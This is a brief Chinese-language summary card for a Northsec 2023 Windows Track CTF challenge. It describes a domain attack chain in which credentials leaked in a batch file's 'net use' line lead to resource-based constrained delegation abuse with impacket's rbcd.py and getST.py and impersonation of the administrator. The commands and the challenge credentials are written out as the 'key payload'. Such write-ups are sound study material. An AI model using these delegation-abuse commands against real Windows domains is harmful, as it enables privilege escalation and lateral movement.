---
title: "Windows Track Northsec 2023 Writeup"
category: web
tags: ["Northsec 2023 (Windows Track)", "web", "kerberos_delegation", "rbcd_py", "getst_py", "resource_based_constrained_delegation"]
signals: ["Northsec 2023 (Windows Track) 2023", "kerberos_delegation", "rbcd_py", "getst_py", "resource_based_constrained_delegation", "atm_net_use", "swiftmq_amqp_ssl", "amqp_5671", "ipv6_scan", "crypto_symmetric", "Northsec", "Windows", "IPv6", "RunUpdate"]
difficulty: hard
source: "https://www.ctfiot.com/123678.html"
tools: ["C", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Windows Track Northsec 2023 Writeup

> 赛事：Northsec 2023 (Windows Track) 2023 | 方向：web | 难度：hard | 工具：C、Python

## 一句话总结

Northsec 2023 Windows 域攻击链：IPv6 主机发现 + RunUpdate.bat net use 暴露 NFS 凭据 + rot47 解密 + rbcd RBCD 委派 + getST 伪造 cifs S4U2Self+Self 票据 + swiftmq AMQP SSL 通信。

## 攻击链

1. IPv6 扫描发现 www.bank.ctf + atm01.bank.ctf → net use z: \NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService (暴露 NFS 凭据) → copy z:\software C:\Packages → rot47 解密 u{pv\a_732_d57g36275ffh_3cbgde5fg`6hc → rbcd.py -action write -delegate-from ''webdev-old$'' -delegate-to ''ATM01$'' ''bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'' → getST.py -spn ''cifs/atm01.bank.ctf'' -impersonate administrator → swiftmq 5671 SSL AMQP + pika SSLOptions 链

## 关键 payload

```
net use z: \NFS01\atm\packages qb@ZWFVF2$1w$[*= /user:bank\ATMService / rbcd.py -action write -delegate-from ''webdev-old$'' -delegate-to ''ATM01$'' ''bank.ctf/ATMService:qb@ZWFVF2$1w$[*=1337'' / getST.py -spn ''cifs/atm01.bank.ctf'' -impersonate administrator -dc-ip ... -dc-ip
```

## 经验教训

RunUpdate.bat 类批处理日志直接暴露 net use 凭据是 Windows 域内网经典；rbcd.py + getST.py 是 impacket 域内 RBCD 委派攻击标配。

## 标签

kerberos_delegation、rbcd_py、getst_py、resource_based_constrained_delegation、atm_net_use、swiftmq_amqp_ssl、amqp_5671、ipv6_scan、nfs_mount_packages、swiftmq_rabbitmq

## 参考来源

- https://www.ctfiot.com/123678.html
- 原文件：Windows_Track_Northsec_2023_Writeup.full.md
